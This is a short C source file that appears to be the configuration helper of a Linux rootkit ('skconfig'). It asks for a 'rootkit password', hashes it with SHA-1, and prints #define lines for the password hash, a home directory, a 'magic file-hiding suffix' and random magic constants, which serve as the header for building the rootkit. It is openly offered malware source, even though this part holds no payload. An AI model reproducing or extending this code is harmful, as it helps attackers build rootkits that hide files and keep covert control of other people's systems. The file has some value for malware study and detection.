/*
 * $Id: zpass.c, stuff for 'skconfig'
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <termios.h>
#include <string.h>
#include <time.h>

#include "sk.h"
#include "sha1.h"
#include "crypto.h"

#define SR (uint) ((ulong) rand() ^ ((ulong) rand() << 1))

int	main()
{
        struct  termios old, new;
	char	p1[256], p2[256], *t;
	struct	hash h;
	int	i;

        tcgetattr(0, &old);
        new = old;
        new.c_lflag &= ~(ICANON | ECHO | ISIG);
        new.c_iflag &= ~(IXON | IXOFF);

	fprintf(stderr, "%s\n\n", BANNER);

	while (1) {
	        tcsetattr(0, TCSAFLUSH, &new);
		fprintf(stderr, "Please enter new rootkit password:");
		fflush(stderr);
		fgets(p1, 255, stdin);
		fprintf(stderr, "\nAgain, just to be sure:");
		fflush(stderr);
		fgets(p2, 255, stdin);
	        tcsetattr(0, TCSAFLUSH, &old);
		if (!*p1 || !*p2 || *p1 == '\n' || *p2 == '\n') {
			fprintf(stderr, "\n--- Aborted! ---\n");
			return 1;
		}
		if (!strcmp(p1, p2)) {
			fprintf(stderr, "\nOK, new password set.\n");
			break;
		} else {
			fprintf(stderr,
				"\nMistyped password, next please...\n");
		}
	}
	hash160(p1, strlen(p1), &h);
	printf("#define\tHASHPASS\t\"");
	for (i = 0; i < 20; i++) {
		printf("\\x%02x", h.val[i]);
	}
	printf("\"\n");
	fprintf(stderr, "Home directory [%s]: ", DEFHOME); fflush(stderr);
	fgets(p1, 255, stdin);
	if ((!*p1) || (*p1 == '\n'))
		strcpy(p1, DEFHOME);
	
	t = strchr(p1, '\n');
	if (t) {
		*t = 0;
	}

	fprintf(stderr, "Magic file-hiding suffix [%s]: ", DEFHIDE);
	fflush(stderr);

	fgets(p2, 255, stdin);
	if ((!*p2) || (*p2 == '\n'))
		strcpy(p2, DEFHIDE);

	t = strchr(p2, '\n');
	if (t) {
		*t = 0;
	}


	printf("#define\tHOME\t\"%s\"\n", p1);
	printf("#define\tHIDESTR\t\"%s\"\n", p2);
	srand(time(NULL));
	printf(	"#define\tMAGIC1\t0x%08x\n"
		"#define\tMAGIC2\t0x%08x\n", SR, SR);

	return 0;
}
